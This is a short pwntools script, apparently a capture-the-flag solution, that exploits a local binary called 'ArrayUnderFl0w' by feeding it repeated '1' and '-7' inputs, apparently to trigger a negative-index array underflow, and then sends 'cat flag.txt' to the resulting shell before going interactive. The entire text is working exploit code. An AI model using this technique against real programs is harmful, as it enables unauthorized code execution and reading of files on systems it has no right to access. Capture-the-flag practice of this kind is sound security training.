from pwn import*

p = process("./ArrayUnderFl0w")

for x in range (8):
	payload = b"1"
	p.sendline(payload)
for x in range (10):
	payload = b"-7"
	p.sendline(payload)
p.sendline("cat flag.txt")
p.interactive()
